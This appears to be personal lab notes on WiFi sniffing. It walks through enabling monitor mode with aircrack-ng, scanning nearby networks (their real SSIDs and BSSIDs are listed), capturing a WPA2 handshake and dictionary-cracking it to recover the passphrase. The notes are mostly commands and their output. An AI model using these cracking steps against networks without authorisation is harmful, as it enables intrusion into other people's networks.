# WiFi Sniffer
## [Reference Doc](https://docs.qq.com/doc/DWUJbWxMSktqUnZw)
## WiFi Card Ability
```c
D:\Eric\apk>netsh wlan show interfaces
There are 2 interfaces on the system:
    Name                   : WLAN
    Description            : Intel(R) Wi-Fi 6 AX201 160MHz
    GUID                   : 62357492-80e3-4fd6-8e64-b9b4fcf09a79
    Physical address       : c4:03:a8:04:7a:31
    Interface type         : Primary
    State                  : connected
    SSID                   : rush
    AP BSSID               : 90:98:38:8a:df:5c
    Band                   : 5 GHz
    Channel                : 44
    Connected Akm-cipher   : [ akm = 00-0f-ac:02, cipher =  00-0f-ac:04 ]
    Network type           : Infrastructure
    Radio type             : 802.11ax
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Connection mode        : Auto Connect
    Receive rate (Mbps)    : 817
    Transmit rate (Mbps)   : 907
    Signal                 : 85%
    Profile                : rush
    QoS MSCS Configured         : 0
    QoS Map Configured          : 0
    QoS Map Allowed by Policy   : 0

    Name                   : WLAN 2
    Description            : MediaTek Wi-Fi 6/6E Wireless USB LAN Card
    GUID                   : f59e16c6-253e-4d59-99be-afe5e5048032
    Physical address       : 90:de:80:d9:d3:73
    Interface type         : Primary
    State                  : disconnected
    Radio status           : Hardware On
                             Software On
```
```c
wlanhelper.exe f59e16c6-253e-4d59-99be-afe5e5048032 modes
managed
```
## WiFi Card Monitor Support
[MT7921AU](https://item.taobao.com/item.htm?_u=928s7to9567&id=777632016647)
## Enable Monitor Mode
### Prepare
```c
sudo apt install aircrack-ng
```
### Set Monitor Mode
```c
eric@u24:~/Desktop$ ifconfig -a
wlx90de80d9d373: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 90:de:80:d9:d3:73  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
eric@u24:~/Desktop$ sudo airmon-ng check kill&&sudo airmon-ng start wlx90de80d9d373
PHY	    Interface	    Driver		Chipset
phy1	wlx90de80d9d373	mt7921u		MediaTek Inc. Wireless_Device
Interface wlx90de80d9d373mon is too long for linux so it will be renamed to the old style (wlan#) name.
		(mac80211 monitor mode vif enabled on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlx90de80d9d373)
eric@u24:~/Desktop$ sudo ifconfig wlan0mon up
eric@u24:~/Desktop$ ifconfig
wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 90-DE-80-D9-D3-73-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 1644  bytes 514128 (514.1 KB)
        RX errors 0  dropped 1644  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
## Scan WiFi
```c
sudo airodump-ng wlan0mon 
sudo airodump-ng -C 5180-5885 wlan0mon
```
```c
eric@u24:~/Desktop$ sudo airodump-ng wlan0mon
 CH  4 ][ Elapsed: 6 s ][ 2025-09-09 09:16 
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 A2:69:D9:0D:DF:FA  -82        1        1    0   6  360   WPA2 CCMP   PSK  HCT-VIP-2.4G                                                                                                  
 54:D7:E3:5F:EA:A1  -87        2        0    0   6  130   WPA2 CCMP   PSK  lensgms                                                                                                       
 44:DF:65:E8:99:57  -34        7        0    0   6  360   WPA2 CCMP   PSK  Eip8_plus                                                                                                     
 A0:69:D9:0D:DF:FA  -85        5        2    0   6  360   WPA2 CCMP   PSK  HCTAPA                                                                                                        
 12:69:6C:C4:65:54  -70        2        0    0  11  130   WPA2 CCMP   PSK  Lens-VIP                                                                                                      
 06:69:6C:C4:65:54  -71        4        0    0  11  130   WPA2 CCMP   PSK  Internal                                                                                                      
 54:D7:E3:63:FA:81  -66        4        0    0  11  130   WPA2 CCMP   PSK  Internal                                                                                                      
 54:D7:E3:64:92:01  -84        2        0    0  11  130   WPA2 CCMP   PSK  Internal                                                                                                      
 62:02:5B:66:C4:61  -78        2        0    0  11  360   WPA2 CCMP   PSK  Amigo_S23+                                                                                                    
 16:69:6C:C4:65:54  -70        4        0    0  11  130   WPA2 CCMP   PSK  Internal-VLAN120                                                                                              
 0E:69:6C:C4:65:54  -71        5        0    0  11  130   WPA2 CCMP   PSK  lensgms                                                                                                       
 0A:69:6C:C4:65:54  -68        4        0    0  11  130   WPA2 CCMP   PSK  lens8                                                                                                         
 06:18:D6:2B:9B:EA  -76        5        0    0  11  130   WPA2 CCMP   PSK  HCTAPA                                                                                                        
 B2:0C:DE:E5:80:25  -80        1       11    2  11  360   WPA3 CCMP   SAE  AndroidAP_8611                                                                                                
 54:D7:E3:63:FA:82  -65        4        0    0  11  130   WPA2 CCMP   PSK  lensgms                                                                                                       
 4C:81:25:06:E2:C6  -82        2        0    0   4  135   WPA2 CCMP   PSK  E5576-822_E2C6                                                                                                
 6C:0A:BF:37:D1:88  -34       13        2    0   9  130   WPA2 CCMP   PSK  RA66-5RqE                                                                                                     
 70:C6:DD:3F:4A:60  -69        5        8    2   6  360   WPA2 CCMP   PSK  HCTAPA                                                                                                        
 46:D1:2F:B2:71:52  -27       11        0    0   6  130   WPA2 CCMP   PSK  Eip8                                                                                                          
 54:D7:E3:60:09:E1  -84        3        0    0   6  130   WPA2 CCMP   PSK  Internal                                                                                                      
 72:C6:DD:3F:4A:60  -69        2        0    0   6  360   WPA2 CCMP   PSK  HCT-VIP-2.4G                                                                                                  
 54:D7:E3:60:09:E2  -84        2        0    0   6  130   WPA2 CCMP   PSK  lensgms                                                                                                                                                                           
Quitting...
```

## Capture Handshake Packet
```c
eric@u24:~/Desktop$ sudo airodump-ng -c 6 --bssid  44:DF:65:E8:99:57 -w wsb1 wlan0mon
09:19:16  Created capture file "wsb1-01.cap".
 CH  6 ][ Elapsed: 1 min ][ 2025-09-09 09:20 ][ WPA handshake: 44:DF:65:E8:99:57 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 44:DF:65:E8:99:57  -18 100      905    50003    7   6  360   WPA2 CCMP   PSK  Eip8_plus                                                                                                 
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
 44:DF:65:E8:99:57  1A:DE:CF:CE:8A:70  -21    6e- 1e    43    50573  EAPOL  Eip8_plus                                                                                                     
Quitting...
```
### Read Cap File
```c
sudo wireshark
```
## Password Cracking
Before running the password cracking process, copy the dictionary file into the dictionary folder.   
The dictionary file should be in txt format.

```c
sudo aircrack-ng -a2 -b 20:0D:B0:07:A0:D9 -w ./key.txt ./wsb1-01.cap
```
Note: Ensure the path is correct, otherwise an error will be reported.

Parameters:
    The value after -b is the MAC address (BSSID) of the target WiFi.
    The value after -w is the path to the password dictionary file (./key.txt in this command).
    The last parameter is the path to the captured handshake packet file (./wsb1-01.cap).

KEY FOUND! [ 12345678 ]
The text within the brackets, 12345678, is the password for the experimental WiFi.

```c
eric@u24:~/Desktop$ sudo aircrack-ng -a2 -b 44:DF:65:E8:99:57 -w ./key.txt ./wsb1-01.cap
Reading packets, please wait...
Opening ./wsb1-01.cap
Read 88599 packets.
1 potential targets
                               Aircrack-ng 1.7 
      [00:00:00] 1/2 keys tested (47.11 k/s) 
      Time left: 0 seconds                                      50.00%

                           KEY FOUND! [ 12345678 ]
      Master Key     : F8 0E 6E 1B 06 46 85 51 57 01 C5 CD CA DC 80 B3 
                       3A 70 A4 75 DB FB 82 C3 F2 DD 18 53 46 77 DB 33 

      Transient Key  : 98 E3 4D 0C 12 7B BB 54 5E AD 71 F4 75 90 83 35 
                       97 BC BD 59 E5 11 C2 32 D2 FA 3C 85 D8 FB BC E5 
                       2B 8C A7 F4 14 32 5B 6B BD 82 97 E6 49 41 1E 0F 
                       A4 E4 21 A2 19 E9 34 1A AE 0B 5F C4 54 B2 30 15 

      EAPOL HMAC     : C7 1E 9A 94 25 49 0B 9C 62 65 73 52 9E 6B 79 FD 
```

## Usage
### Filter Address
```c
wlan.addr == 44:DF:65:E8:99:57
wlan.addr == 1a:de:cf:ce:8a:70
```
### Filter Handshake Packet
EAPOL -> EAP over LAN -> Extensible Authentication Protocol over Local Area Network  
```c
eapol
```
